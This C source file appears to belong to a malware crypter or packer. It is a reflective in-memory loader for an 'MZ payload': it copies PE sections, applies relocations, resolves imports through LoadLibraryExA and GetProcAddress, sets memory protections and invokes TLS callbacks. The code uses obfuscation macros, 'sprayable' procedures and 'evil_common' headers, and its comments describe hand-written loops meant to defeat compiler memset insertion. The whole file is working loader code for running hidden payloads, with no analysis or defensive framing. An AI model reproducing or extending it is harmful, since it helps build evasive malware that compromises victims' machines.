//@@@headers
#include "ldr.h"
#include "lpfns.h"
#include "evil_common.h"
#include "check_payload_info.h" // PAYLOAD_XXX
#include "dbg.h"
//@@@endheaders

#ifdef PAYLOAD_SHELLCODE
#error("This file is for MZ payload, not shellcode")
#endif

//@@@privdefs
#define _CHKRELOC(p) {if (p->type != IMAGE_REL_BASED_DIR64 && p->type != IMAGE_REL_BASED_HIGHLOW && p->type != IMAGE_REL_BASED_HIGH && p->type != IMAGE_REL_BASED_LOW && p->type != IMAGE_REL_BASED_ABSOLUTE) { dbgprn("bad reloc type %d\n", p->type); XASSERT(0); } }
//@@@endprivdefs


//@@@zvars
IMAGE_NT_HEADERS* ldr_pNtHdrs;
IMAGE_OPTIONAL_HEADER* ldr_pOptHdr;
IMAGE_SECTION_HEADER* ldr_pSecHdrs;
IMAGE_DATA_DIRECTORY* ldr_pDataDir;

DWORD copysec_idx;
DWORD copysec_dwSecAlignedVSize;
PVOID copysec_SecMapped;
PVOID copysec_SecRaw;
DWORD copysec_dwSecDataSize;
DWORD copysec_dwPaddingSize;
BYTE* copysec_lpPadStart;

DWORD_PTR reloc_RelocDelta;
PIMAGE_BASE_RELOCATION reloc_lpRelocEntry;
DWORD_PTR reloc_dwNumberOfRelocBlocks;
DWORD_PTR reloc_dwTotalNumberOfRelocs;
void* reloc_lpPtrToFix;
void* reloc_lpPtrToFixCur;
DWORD_PTR reloc_NumRelocs;
PIMAGE_RELOC reloc_lpEntry;

DWORD protsec_idx;
DWORD protsec_dwCut;
PVOID protsec_SecMapped;
DWORD protsec_dwSecAlignedVSize;
DWORD protsec_dwOldProtect;
BOOL protsec_bOk;
DWORD protsec_dwLastErr;
LPVOID protsec_lpTargetImage; // PUBLIC; only for ldr_prot_sec cuz it has too many args

IMAGE_IMPORT_DESCRIPTOR* imps_id;
IMAGE_THUNK_DATA* imps_originalThunk, * imps_thunk;
IMAGE_IMPORT_BY_NAME* imps_byName;
LPCSTR imps_lpLibName;
PVOID imps_hImportLib;
LPCSTR imps_lpFuncName;
BOOL imps_bOrdinal;
DWORD imps_dwOldProt;

PIMAGE_TLS_DIRECTORY tls_pTlsDir;
PIMAGE_TLS_CALLBACK* tls_ppCallback;
DWORD_PTR tls_delta;

//@@@endzvars


// -------------------------- [ COPY SECTIONS ] --------------------------

static SPRAYABLE_PROC(ldr_copysec_iter_uninitdata) {
  //@@@proc /name ldr_copysec_iter_uninitdata
  // Uninitialized data
  //memset(Z(copysec_SecMapped), Z(copysec_dwSecAlignedVSize), '\0');
  for (DWORD i = 0; i < Z(copysec_dwSecAlignedVSize) / 4; i++) { *(DWORD*)((DWORD_PTR)Z(copysec_SecMapped) + i * 4) = 0; }
  //continue;
  //@@@endproc
}

static SPRAYABLE_PROC(ldr_copysec_iter_initdata) {
  //@@@proc /name ldr_copysec_iter_initdata
  //memcpy(Z(copysec_SecMapped), Z(copysec_SecRaw), Z(copysec_dwSecDataSize));
  //if (ALIGN_UP(Z(copysec_dwSecDataSize), 4) != Z(copysec_dwSecDataSize)) { return -9877; } // SKIP checks, let it crash
  // copy from end to beginning to disable memset replacement
  for (DWORD i = 0; i < Z(copysec_dwSecDataSize) / 4; i++) { *(DWORD*)((DWORD_PTR)Z(copysec_SecMapped) + i * 4) = *(DWORD*)((DWORD_PTR)Z(copysec_SecRaw) + i * 4); }
  // Padding
  Z(copysec_dwPaddingSize) = Z(copysec_dwSecAlignedVSize) - Z(copysec_dwSecDataSize);
  //memset((void*)((DWORD_PTR)Z(copysec_SecMapped) + Z(copysec_dwSecDataSize)), '\0', Z(copysec_dwPaddingSize));
  Z(copysec_lpPadStart) = (BYTE*)((DWORD_PTR)Z(copysec_SecMapped) + Z(copysec_dwSecDataSize));
  // prevent memset insertion
  for (DWORD i = 1; i < Z(copysec_dwPaddingSize); i += 2) { i -= 1; Z(copysec_lpPadStart[i]) = 0; }
  //@@@endproc
}


static SPRAYABLE_PROC(ldr_copysec_iter) {
  //@@@proc /name ldr_copysec_iter
  Z(copysec_SecMapped) = (void*)((DWORD_PTR)CUR_A1 + Z(ldr_pSecHdrs[Z(copysec_idx)].VirtualAddress)); // lpMappedImage
  Z(copysec_SecRaw) = (void*)((DWORD_PTR)CUR_A2 + Z(ldr_pSecHdrs[Z(copysec_idx)].PointerToRawData));     // lpRawImage
  Z(copysec_dwSecDataSize) = Z(ldr_pSecHdrs[Z(copysec_idx)].SizeOfRawData);
  Z(copysec_dwSecAlignedVSize) = ALIGN_UP(Z(ldr_pSecHdrs[Z(copysec_idx)].Misc.VirtualSize), PAGE_SIZE);
  if (!Z(copysec_dwSecDataSize)) { _CALL(ldr_copysec_iter_uninitdata); }
  if (Z(copysec_dwSecDataSize)) { _CALL(ldr_copysec_iter_initdata); }
  //@@@endproc
}


// A1 -> lpMappedImage, A2 -> lpRawImage; using headers in ldr_ vars
SPRAYABLE_PROC(ldr_copy_sections) {
  //@@@proc /name ldr_copy_sections
  CHILD_A1 = CUR_A1;
  CHILD_A2 = CUR_A2; dbgprn("copying %d sections\n", Z(ldr_pNtHdrs)->FileHeader.NumberOfSections);
  for (Z(copysec_idx) = 0; Z(copysec_idx) < Z(ldr_pNtHdrs)->FileHeader.NumberOfSections; Z(copysec_idx)++) { _CALL(ldr_copysec_iter); }
  //@@@endproc
}

// -------------------------- [ PROCESS RELOCS ] --------------------------

// A1 -> lpImageBeingFixed
static SPRAYABLE_PROC(ldr_reloc_relociter) {
  //@@@proc /name ldr_reloc_relociter
  // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required. we dont use a switch
  // statement to avoid the compiler building a jump table which would not be very position independent!
  Z(reloc_lpPtrToFixCur) = (ULONG_PTR*)((DWORD_PTR)Z(reloc_lpPtrToFix) + Z(reloc_lpEntry)->offset); _CHKRELOC(Z(reloc_lpEntry));
  if (Z(reloc_lpEntry)->type == IMAGE_REL_BASED_DIR64)   { *(ULONG_PTR*)Z(reloc_lpPtrToFixCur) += Z(reloc_RelocDelta); }
  if (Z(reloc_lpEntry)->type == IMAGE_REL_BASED_HIGHLOW) { *(DWORD*)Z(reloc_lpPtrToFixCur) += (DWORD)Z(reloc_RelocDelta); }
  if (Z(reloc_lpEntry)->type == IMAGE_REL_BASED_HIGH)    { *(WORD*)Z(reloc_lpPtrToFixCur) += HIWORD(Z(reloc_RelocDelta)); }
  if (Z(reloc_lpEntry)->type == IMAGE_REL_BASED_LOW)     { *(WORD*)Z(reloc_lpPtrToFixCur) += LOWORD(Z(reloc_RelocDelta)); }
  //dbgprn(" fixed type %d (%x) addr %p  [rva %x]\n", Z(reloc_lpEntry)->type, Z(reloc_lpEntry)->type, Z(reloc_lpPtrToFixCur), ((DWORD_PTR)Z(reloc_lpPtrToFixCur)-(DWORD_PTR)CUR_A1));
  //if reloc_lpEntry->type is unknown???
  // get the next entry in the current relocation block
  Z(reloc_lpEntry) = (PIMAGE_RELOC)((DWORD_PTR)Z(reloc_lpEntry) + sizeof(IMAGE_RELOC));
  //Z(reloc_dwTotalNumberOfRelocs) += 1;//unused
  //@@@endproc
}

static SPRAYABLE_PROC(ldr_reloc_blockiter) {
  //@@@proc /name ldr_reloc_blockiter

  Z(reloc_lpPtrToFix) = (void*)((DWORD_PTR)CUR_A1 + Z(reloc_lpRelocEntry)->VirtualAddress);
  // NumRelocs = number of entries in this relocation block
  Z(reloc_NumRelocs) = ((Z(reloc_lpRelocEntry)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC));

  // lpEntry is now the first entry in the current relocation block
  Z(reloc_lpEntry) = (PIMAGE_RELOC)((DWORD_PTR)Z(reloc_lpRelocEntry) + sizeof(IMAGE_BASE_RELOCATION));

  dbgprn("ldr_reloc_blockiter: %d relocs\n", (unsigned)Z(reloc_NumRelocs));
  // we itterate through all the entries in the current block...
  CHILD_A1 = CUR_A1;
  while (Z(reloc_NumRelocs)--) { _CALL(ldr_reloc_relociter); }

  // get the next entry in the relocation directory
  Z(reloc_lpRelocEntry) = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)Z(reloc_lpRelocEntry) + Z(reloc_lpRelocEntry)->SizeOfBlock);
  //Z(reloc_dwNumberOfRelocBlocks) += 1; //unused
  //@@@endproc
}

// A1 -> lpMappedImage (allocated space); using headers in ldr_ vars
SPRAYABLE_PROC(ldr_process_relocs) {
  //@@@proc /name ldr_process_relocs
  XASSERT(Z(ldr_pDataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) != 0); // check was moved outer, here we expect
  Z(reloc_RelocDelta) = (DWORD_PTR)CUR_A1 - Z(ldr_pOptHdr)->ImageBase;
  // lpRelocEntry is now the first entry (IMAGE_BASE_RELOCATION)
  Z(reloc_lpRelocEntry) = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)CUR_A1 + Z(ldr_pDataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));
  Z(reloc_dwNumberOfRelocBlocks) = 0; //Z(ldr_dwTotalNumberOfRelocs) = 0; //unused
  // and we itterate through all entries...
  CHILD_A1 = CUR_A1;
  while (Z(reloc_lpRelocEntry)->SizeOfBlock && Z(reloc_lpRelocEntry)->VirtualAddress < Z(ldr_pOptHdr)->SizeOfImage - 4) { _CALL(ldr_reloc_blockiter); }
  //@@@endproc
}

// -------------------------- [ PROTECT SECTIONS ] --------------------------


// public
// returns 1
// protsec_lpTargetImage -> image, A1D -> ObfEncDw(dwSecIdx), A2D -> ObfEncDw(dwProtect)
SPRAYABLE_PROC(ldr_prot_sec_with) {
  //@@@proc /name ldr_prot_sec_with
  STK_TMPVAR1D = ObfDecDw(CUR_A1D);
  STK_TMPVAR2D = ObfDecDw(CUR_A2D); //dbgprn("STK_TMPVAR1D=%p, STK_TMPVAR2D=%p\n", STK_TMPVAR1D, STK_TMPVAR2D);
  Z(protsec_SecMapped) = (void*)((DWORD_PTR)Z(protsec_lpTargetImage) + Z(ldr_pSecHdrs[STK_TMPVAR1D].VirtualAddress));
  //Z(protsec_dwSecAlignedVSize) = ALIGN_UP(Z(ldr_pSecHdrs[STK_TMPVAR1D].Misc.VirtualSize), PAGE_SIZE); // was PAGE_SIZE for year(s), now change to SectionAlignment
  Z(protsec_dwSecAlignedVSize) = ALIGN_UP(Z(ldr_pSecHdrs[STK_TMPVAR1D].Misc.VirtualSize), Z(ldr_pOptHdr->SectionAlignment));
  Z(protsec_bOk) = Z(lpfnVirtualProtect)(Z(protsec_SecMapped), Z(protsec_dwSecAlignedVSize), STK_TMPVAR2D, &Z(protsec_dwOldProtect)); Z(protsec_dwLastErr) = GetLastError();
  //Z(ldr_pSecHdrs[STK_TMPVAR1D].Name) may contain bad chars which print sounds in console, use index
  dbgprn("sec #%d: VProtect(%p, %x, %x, &) (.Chars=%x)  ret %d, GLE %d\n", STK_TMPVAR1D, Z(protsec_SecMapped), Z(protsec_dwSecAlignedVSize), STK_TMPVAR2D, Z(ldr_pSecHdrs[STK_TMPVAR1D].Characteristics), Z(protsec_bOk), Z(protsec_dwLastErr)); XASSERT(Z(protsec_bOk));
  CUR_RETD = 1;
  //@@@endproc
}

#ifndef LDR_MANUAL_SECTION_LOAD
// internal
// A2D -> dwSecChars, RETD -> dwProtect [A1 already used]
static SPRAYABLE_PROC(ldr_protsec_getprot) {
  //@@@proc /name ldr_protsec_getprot
  Z(protsec_dwCut) = CUR_A2D & 0xE0000000; //(A1D & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE));
  Z(protsec_dwCut) /= 0x20000000; // dwCut >>= 29;
  CUR_RETD = ObfDecB(gkProtmap[Z(protsec_dwCut)]);
  //@@@endproc
}


// public
// returns 1
// A1D -> ObfEncDw(dwSecIdx)
SPRAYABLE_PROC(ldr_prot_sec) {
  //@@@proc /name ldr_prot_sec
  CHILD_A2D = Z(ldr_pSecHdrs[ObfDecDw(CUR_A1D)].Characteristics);
  _CALL(ldr_protsec_getprot);
  CHILD_A1D = CUR_A1D; // dwSecIdx
  CHILD_A2D = ObfEncDw(CHILD_RETD); // dwProtect
  _CALL(ldr_prot_sec_with);
  CUR_RETD = 1;
  //@@@endproc
}
#else


#endif

// -------------------------- [ PROCESS IMPORTS ] --------------------------

static SPRAYABLE_PROC(ldr_imps_use_ordinal) {
  //@@@proc /name ldr_imps_use_ordinal
  Z(imps_lpFuncName) = (LPCSTR)(CLEAR_SIG_BIT((DWORD_PTR)Z(imps_originalThunk)->u1.Ordinal));
  Z(imps_bOrdinal) = TRUE;
  //@@@endproc
}

static SPRAYABLE_PROC(ldr_imps_use_name) {
  //@@@proc /name ldr_imps_use_name
  Z(imps_byName) = (IMAGE_IMPORT_BY_NAME*)((DWORD_PTR)CUR_A1 + Z(imps_originalThunk)->u1.AddressOfData);
  Z(imps_lpFuncName) = (LPCSTR)Z(imps_byName)->Name;
  //@@@endproc
}

static SPRAYABLE_PROC(ldr_imps_iterfunc) {
  //@@@proc /name ldr_imps_iterfunc
  CHILD_A1 = CUR_A1;
  Z(imps_bOrdinal) = SIG_BIT_IS_SET(Z(imps_originalThunk)->u1.Ordinal);
  if (Z(imps_bOrdinal)) { _CALL(ldr_imps_use_ordinal); } else { _CALL(ldr_imps_use_name); }
  //Z(imps_bOk) = Z(lpfnVirtualProtect)(&Z(imps_thunk)->u1.Function, sizeof(DWORD_PTR), PAGE_READWRITE, &Z(imps_dwOldProt));
  Z(imps_thunk)->u1.Function = (DWORD_PTR)GetProcAddress((HMODULE)Z(imps_hImportLib), Z(imps_lpFuncName)); /*dbgprn(Z(imps_bOrdinal) ? " found imported func:  %s.#%d -> %p\n" : " found imported func:  %s.%s -> %p\n", Z(imps_lpLibName), Z(imps_lpFuncName), Z(imps_thunk)->u1.Function);*/ XASSERT(Z(imps_thunk)->u1.Function);
  //if (thunk->u1.Function == NULL) { return -508; }
  //Z(imps_bOk) = Z(lpfnVirtualProtect)(&Z(imps_thunk)->u1.Function, sizeof(DWORD_PTR), Z(imps_dwOldProt), &Z(imps_dwOldProt));
  Z(imps_originalThunk)++;
  Z(imps_thunk)++;
  //@@@endproc
}

// A1 -> lpMappedImage
static SPRAYABLE_PROC(ldr_imps_iterlib) {
  //@@@proc /name ldr_imps_iterlib
  Z(imps_lpLibName) = (LPCSTR)((DWORD_PTR)CUR_A1 + ((ULONG)Z(imps_id)->Name));
  Z(imps_hImportLib) = Z(lpfnLoadLibraryExA)(Z(imps_lpLibName), NULL, 0); dbgprn("LOADED IMPORT LIB %s -> %p\n", Z(imps_lpLibName), Z(imps_hImportLib)); XASSERT(Z(imps_hImportLib));
  //if (!hImportLib) { return -506; !!!}
  Z(imps_thunk) = (IMAGE_THUNK_DATA*)((DWORD_PTR)CUR_A1 + Z(imps_id)->FirstThunk);
  Z(imps_originalThunk) = (IMAGE_THUNK_DATA*)((DWORD_PTR)CUR_A1 + Z(imps_id)->OriginalFirstThunk);
  CHILD_A1 = CUR_A1;
  while (Z(imps_originalThunk)->u1.Ordinal) { _CALL(ldr_imps_iterfunc); }
  Z(imps_id)++;
  //@@@endproc
}


// A1 -> lpMappedImage
SPRAYABLE_PROC(ldr_process_imports) {
  //@@@proc /name ldr_process_imports
  CHILD_A1 = CUR_A1;
  Z(imps_id) = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD_PTR)CUR_A1 + Z(ldr_pDataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress));
  while (Z(imps_id)->Characteristics) { _CALL(ldr_imps_iterlib); }
  //@@@endproc
}


// -------------------------- [ PROCESS TLS ] --------------------------

// A1 -> lpMappedImage
// The caller should check DataDirectory[TLS] .VA and Size, if null(s), don't call this func.
SPRAYABLE_PROC(ldr_call_tls_callbacks) {
  //@@@proc /name ldr_call_tls_callbacks
  Z(tls_pTlsDir) = (PIMAGE_TLS_DIRECTORY)((DWORD_PTR)CUR_A1 + Z(ldr_pDataDir[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress));
  Z(tls_ppCallback) = (PIMAGE_TLS_CALLBACK*)(Z(tls_pTlsDir)->AddressOfCallBacks);
#ifdef LDR_FIXUP_TLS_POINTER
  // some need fixup; maybe this is problem in basereloc processing code
  Z(tls_delta) = (DWORD_PTR)CUR_A1 - (DWORD_PTR)Z(ldr_pOptHdr)->ImageBase;
  Z(tls_ppCallback) = (PIMAGE_TLS_CALLBACK*)((DWORD_PTR)Z(tls_ppCallback) + Z(tls_delta));
#endif
  for (; *Z(tls_ppCallback); Z(tls_ppCallback)++) { (*Z(tls_ppCallback))(CUR_A1, DLL_PROCESS_ATTACH, NULL); }
  //@@@endproc
}

